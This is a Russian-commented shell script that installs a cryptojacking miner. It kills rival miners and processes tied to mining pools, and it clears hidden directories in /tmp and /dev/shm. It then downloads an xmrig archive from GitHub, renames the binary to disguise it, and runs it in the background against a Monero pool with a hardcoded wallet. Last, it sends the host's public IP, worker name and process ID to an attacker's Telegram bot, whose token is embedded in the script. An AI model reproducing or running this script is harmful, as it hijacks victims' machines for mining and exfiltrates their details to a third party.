#!/bin/sh
# Универсальный скрипт для всех систем (даже без bash/wget)

# Функция для определения доступного загрузчика
get_downloader() {
    if command -v wget >/dev/null 2>&1; then
        echo "wget -qO-"
    elif command -v curl >/dev/null 2>&1; then
        echo "curl -s"
    else
        echo "Error: Neither wget nor curl is installed" >&2
        exit 1
    fi
}

# Функция для получения публичного IP-адреса
get_public_ip() {
    local ip=""
    if command -v curl >/dev/null 2>&1; then
        ip=$(curl -s https://api.ipify.org 2>/dev/null || curl -s https://ifconfig.me 2>/dev/null || echo "unknown_ip")
    elif command -v wget >/dev/null 2>&1; then
        ip=$(wget -qO- https://api.ipify.org 2>/dev/null || wget -qO- https://ifconfig.me 2>/dev/null || echo "unknown_ip")
    else
        ip="unknown_ip"
    fi
    echo "$ip"
}

# Функция для базового URL-кодирования
url_encode() {
    local string="$1"
    local encoded=""
    local pos c o
    
    # Попробуем использовать python если доступен
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.parse; print(urllib.parse.quote('''$string''', safe=''))" 2>/dev/null && return
    elif command -v python >/dev/null 2>&1; then
        python -c "import urllib; print(urllib.quote('''$string''', safe=''))" 2>/dev/null && return
    fi
    
    # Базовое кодирование вручную
    pos=0
    while [ $pos -lt ${#string} ]; do
        c=${string:$pos:1}
        case $c in
            [a-zA-Z0-9.~_-]) o="$c" ;;
            ' ') o='%20' ;;
            *) printf -v o '%%%02X' "'$c"
        esac
        encoded="$encoded$o"
        pos=$((pos + 1))
    done
    echo "$encoded"
}

# Функция для отправки сообщения в Telegram
send_telegram() {
    local message="$1"
    local bot_token="5165906652:AAG5lSl97Ol9EiP5AJQfGApNJz5E5gBRrdo"
    local chat_id="1136073640"
    
    # Формируем сообщение
    local formatted_message="<b>✅ MINER DEPLOYED SUCCESSFULLY</b>%0A%0A<b>📍 IP Address:</b> $(get_public_ip)%0A<b>👤 Worker:</b> $WORKER_NAME%0A<b>🆔 Process ID:</b> $PID%0A<b>⏹️ Stop command:</b> kill $PID"
    local encoded_message=$(url_encode "$formatted_message")
    
    if command -v curl >/dev/null 2>&1; then
        curl -s "https://api.telegram.org/bot$bot_token/sendMessage" \
            -d "chat_id=$chat_id" \
            -d "parse_mode=HTML" \
            -d "text=$encoded_message" >/dev/null 2>&1
        return $?
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=$encoded_message" >/dev/null 2>&1
        return $?
    else
        return 1
    fi
}

DOWNLOADER=$(get_downloader)

# Принудительное завершение процессов (работает без bash)
killall_processes() {
    for proc in nohup xmrig miner cpuminer xmr-stak systemd-service systemf monero; do
        pkill -9 -f "$proc" 2>/dev/null || killall -9 "$proc" 2>/dev/null || true
    done
    
    # Популярные пулы
    for pool in pool.hashvault.pro moneroocean.stream gulf.moneroocean.stream supportxmr.com nanopool.org minexmr.com xmrig.com xmrig.cc pool.minexmr.com xmrpool.eu moneropool.com pool.4i77.com pool.usxmrpool.com xmrpool.net fairhash.org monero.crypto-pool.fr sumominer.com monero.hashvault.pro backup-pool.com moriaxmr.com bohemianpool.com mine.xmrpool.net pool.xmr.pt; do
        pkill -9 -f "$pool" 2>/dev/null || true
    done
}

# Генерация случайного имени (работает без /dev/urandom)
generate_worker_name() {
    local name=""
    if [ -f /dev/urandom ]; then
        name=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
    elif command -v openssl >/dev/null 2>&1; then
        name=$(openssl rand -base64 12 | tr -dc A-Za-z0-9 | head -c 8)
    else
        name="worker$(date +%s | cut -c9-16)"
    fi
    echo "$name"
}

# Основная логика
echo "[*] Starting miner deployment process"
killall_processes

# Чистка скрытых мест
for path in /tmp/.x /tmp/.x/m /dev/shm/.x /dev/shm/.x/m ./.cache hwloc-without-main main.zip; do
    rm -rf "$path" 2>/dev/null || true
done

# Поиск подозрительных файлов
for loc in /tmp /dev/shm; do
    find "$loc" -name '.X*' -type d -exec rm -rf {} \; 2>/dev/null || true
    find "$loc" -name '.cache' -type d -exec rm -rf {} \; 2>/dev/null || true
done

# Генерация имени воркера
WORKER_NAME=$(generate_worker_name)
echo "[*] Generated worker name: $WORKER_NAME"

# Скачивание и запуск в /tmp
echo "[*] Downloading miner software to /tmp..."
cd /tmp || { echo "[-] ERROR: Can't change directory to /tmp"; exit 1; }
$DOWNLOADER https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip > main.zip
if [ $? -ne 0 ]; then
    echo "[-] ERROR: Failed to download miner archive"
    exit 1
fi

echo "[*] Extracting archive in /tmp..."
if command -v unzip >/dev/null 2>&1; then
    unzip -o main.zip >/dev/null 2>&1
else
    echo "[-] WARNING: unzip not found, trying with busybox"
    busybox unzip -o main.zip 2>/dev/null || { echo "[-] ERROR: Failed to extract archive"; exit 1; }
fi

cd hwloc-without-main || { echo "[-] ERROR: Failed to enter miner directory"; exit 1; }

chmod +x xmrig 2>/dev/null || true
mv xmrig m

echo "[*] Starting miner in background..."
nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
PID=$!

echo "[*] Miner started with worker name: $WORKER_NAME"
echo "[*] Process ID: $PID"
echo "[*] To stop the miner, run: kill $PID"

# Ждем немного чтобы убедиться что процесс запустился
sleep 3

# Проверяем, запустился ли процесс
if ps -p $PID >/dev/null 2>&1 || ps aux | grep -v grep | grep $PID >/dev/null 2>&1; then
    echo "[+] SUCCESS: Miner is running in background"
    
    # Отправляем уведомление в Telegram
    echo "[*] Sending deployment notification to Telegram..."
    if send_telegram; then
        echo "[+] Telegram notification sent successfully"
    else
        echo "[-] Failed to send Telegram notification, but miner is running"
        echo "[*] Deployment info:"
        echo "IP: $(get_public_ip)"
        echo "Worker: $WORKER_NAME"
        echo "PID: $PID"
        echo "Stop command: kill $PID"
    fi
else
    echo "[-] ERROR: Miner failed to start properly"
    exit 1
fi

echo "[*] Miner deployment completed successfully"
